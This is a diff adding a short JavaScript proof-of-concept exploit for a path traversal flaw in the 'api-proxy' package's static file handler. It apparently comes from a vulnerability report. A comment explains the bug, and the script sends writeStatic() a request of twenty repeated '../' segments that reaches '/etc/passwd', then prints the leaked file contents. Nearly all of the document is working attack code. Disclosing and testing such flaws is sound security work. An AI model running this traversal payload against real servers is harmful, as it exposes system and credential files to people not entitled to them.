@@ -1,0 +1,29 @@
+```javascript
+// Path traversal in api-proxy's static file handler.
+// writeStatic() joins the untrusted request URL directly onto the static
+// root with Path.join (which collapses "..") and hands the resulting
+// absolute path to guessContentType()/writeFile(), which then reads and
+// returns whatever file that path points to - allowing arbitrary file
+// disclosure outside the intended "www" directory.
+
+var writeStatic = require("./node_modules/api-proxy/lib/static.js").writeStatic;
+
+var traversal = "/" + "../".repeat(20) + "etc/passwd";
+var req = { url: traversal };
+var res = {
+  chunks: [],
+  writeHead: function (code, headers) {
+    console.log("STATUS", code, headers);
+  },
+  write: function (data) {
+    this.chunks.push(data);
+  },
+  end: function () {
+    console.log("LEAKED FILE CONTENT:\n" + this.chunks.join(""));
+  },
+};
+
+writeStatic(req, res, function notFound() {
+  console.log("not found");
+});
+```
